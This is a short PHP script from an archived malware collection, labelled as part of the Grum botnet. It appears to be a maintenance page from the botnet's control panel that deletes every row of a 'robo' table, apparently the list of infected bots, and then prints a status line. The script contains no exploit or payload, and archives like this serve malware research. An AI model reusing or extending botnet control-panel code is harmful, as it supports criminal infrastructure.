/*
  name      Grum
  type      botnet
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?
    
    include("cfg.php");
    
    
    $time=date("U")-(3600*24);
        
    $sql = "delete from robo WHERE 1";        
    $result = @mysql_query($sql);    
    
   
  
    echo "ALL GOOD Count: ".$num . "<BR><BR>";
        
?>

